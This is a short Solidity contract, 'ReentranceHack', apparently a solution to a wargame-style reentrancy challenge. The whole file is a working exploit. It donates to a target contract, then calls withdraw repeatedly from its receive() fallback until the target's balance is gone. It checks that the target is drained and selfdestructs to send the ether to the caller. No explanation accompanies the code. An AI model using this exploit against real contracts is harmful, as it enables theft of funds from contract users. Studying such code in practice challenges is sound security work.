// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

error TargetNotDrained();

interface IReentrance {
    function donate(address) external payable;
    function withdraw(uint256) external;
}

contract ReentranceHack {
    IReentrance private immutable target;

    uint256 private constant INITIAL_DONATION = 1e16;

    constructor(address _target) {
        target = IReentrance(_target);
    }

    receive() external payable {
        uint256 amount = _min(INITIAL_DONATION, address(target).balance);
        target.withdraw(amount);
    }

    function attack() external payable {
        target.donate{value: INITIAL_DONATION}(address(this));
        target.withdraw(INITIAL_DONATION);
        if (address(target).balance > 0) revert TargetNotDrained();
        selfdestruct(payable(msg.sender));
    }

    function _min(uint256 x, uint256 y) private pure returns (uint256) {
        return x <= y ? x : y;
    }
}
